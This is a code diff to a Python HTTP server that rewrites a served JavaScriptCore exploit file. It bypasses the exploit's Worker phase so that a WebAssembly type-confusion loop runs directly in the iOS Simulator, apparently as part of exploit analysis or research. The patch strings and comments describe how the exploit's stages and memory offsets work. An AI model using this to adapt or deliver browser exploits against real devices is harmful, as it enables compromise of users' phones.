@@ -46,6 +46,13 @@ BEEF_PATCH = (
     '}else window.setTimeout(u,0)'
 )
 
+# iOS Simulator uses macOS JSC (not real iOS JSC), so the Worker-based pm exploit
+# fails because the hardcoded JSC memory offsets (tt[X]=78528 etc.) are wrong.
+# Patch: skip the Worker phase, start u() loop directly so the simple type-confusion
+# (spreading arrays with WebAssembly instances) can attempt to fire instead.
+WORKER_ORIG = '};a()};class ut{'
+WORKER_PATCH = '};window.setTimeout(u,0)};class ut{'  # bypass Worker, run u() directly
+
 
 class Handler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
@@ -58,7 +65,12 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                 content = content.replace(BEEF_ORIG, BEEF_PATCH)
                 print('[server] Patched 6beef463.js — JSC exploit instrumented', flush=True)
             else:
-                print('[server] WARNING: BEEF_ORIG pattern not found in 6beef463.js', flush=True)
+                print('[server] WARNING: BEEF_ORIG not found in 6beef463.js', flush=True)
+            if WORKER_ORIG in content:
+                content = content.replace(WORKER_ORIG, WORKER_PATCH)
+                print('[server] Patched 6beef463.js — Worker phase bypassed, u() starts directly', flush=True)
+            else:
+                print('[server] WARNING: WORKER_ORIG not found in 6beef463.js', flush=True)
             data = content.encode('utf-8')
             self.send_response(200)
             self.send_header('Content-Type', 'application/javascript; charset=utf-8')
